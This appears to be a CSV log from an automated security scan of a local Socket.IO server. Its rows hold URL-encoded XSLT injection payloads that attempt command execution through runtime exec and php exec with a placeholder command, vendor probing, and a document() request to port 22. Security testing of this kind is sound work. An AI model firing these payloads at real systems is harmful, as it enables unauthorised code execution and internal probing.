Id,Req. Timestamp,Resp. Timestamp,Método,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
81032,Tue Jun 02 01:36:08 WEST 2020,Tue Jun 02 01:36:08 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&transport=polling&t=N9n_iER,200,OK,302,229,103
81037,Tue Jun 02 01:36:08 WEST 2020,Tue Jun 02 01:36:09 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&transport=polling&t=N9n_iER,200,OK,258,229,103
81036,Tue Jun 02 01:36:08 WEST 2020,Tue Jun 02 01:36:09 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=websocket&sid=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,400,Bad Request,260,92,18
81040,Tue Jun 02 01:36:09 WEST 2020,Tue Jun 02 01:36:09 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=websocket&sid=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F10.0.2.2%3A22%27%29%22%2F%3E,400,Bad Request,311,92,18
81041,Tue Jun 02 01:36:09 WEST 2020,Tue Jun 02 01:36:09 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3C&t=N9n_iER,400,Bad Request,315,153,40
81044,Tue Jun 02 01:36:09 WEST 2020,Tue Jun 02 01:36:09 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=websocket&sid=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,400,Bad Request,269,92,18
81045,Tue Jun 02 01:36:09 WEST 2020,Tue Jun 02 01:36:09 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&t=N9n_iER,400,Bad Request,271,153,40
81048,Tue Jun 02 01:36:09 WEST 2020,Tue Jun 02 01:36:10 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=websocket&sid=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,400,Bad Request,243,92,18
81049,Tue Jun 02 01:36:09 WEST 2020,Tue Jun 02 01:36:10 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=system-property%28%27xsl%3Avendor%27%29%2F%3E&t=N9n_iER,400,Bad Request,242,153,40
81052,Tue Jun 02 01:36:10 WEST 2020,Tue Jun 02 01:36:10 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&t=N9n_iER,400,Bad Request,264,153,40
81055,Tue Jun 02 01:36:10 WEST 2020,Tue Jun 02 01:36:10 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&t=N9n_iER,400,Bad Request,315,153,40
81058,Tue Jun 02 01:36:10 WEST 2020,Tue Jun 02 01:36:11 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F10.0.2.2%3A22%27%29%22%2F%3E&t=N9n_iER,400,Bad Request,351,153,40
81061,Tue Jun 02 01:36:11 WEST 2020,Tue Jun 02 01:36:11 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&t=N9n_iER,400,Bad Request,239,153,40
81064,Tue Jun 02 01:36:11 WEST 2020,Tue Jun 02 01:36:11 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&t=N9n_iER,400,Bad Request,303,153,40
81067,Tue Jun 02 01:36:11 WEST 2020,Tue Jun 02 01:36:11 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3C,200,OK,268,229,103
81070,Tue Jun 02 01:36:11 WEST 2020,Tue Jun 02 01:36:12 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,270,229,103
81073,Tue Jun 02 01:36:12 WEST 2020,Tue Jun 02 01:36:12 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,211,229,103
81076,Tue Jun 02 01:36:12 WEST 2020,Tue Jun 02 01:36:12 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,227,229,103
81079,Tue Jun 02 01:36:12 WEST 2020,Tue Jun 02 01:36:12 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,304,229,103
81082,Tue Jun 02 01:36:12 WEST 2020,Tue Jun 02 01:36:13 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F10.0.2.2%3A22%27%29%22%2F%3E,200,OK,296,229,103
81085,Tue Jun 02 01:36:13 WEST 2020,Tue Jun 02 01:36:13 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,254,229,103
81088,Tue Jun 02 01:36:13 WEST 2020,Tue Jun 02 01:36:13 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,228,229,103
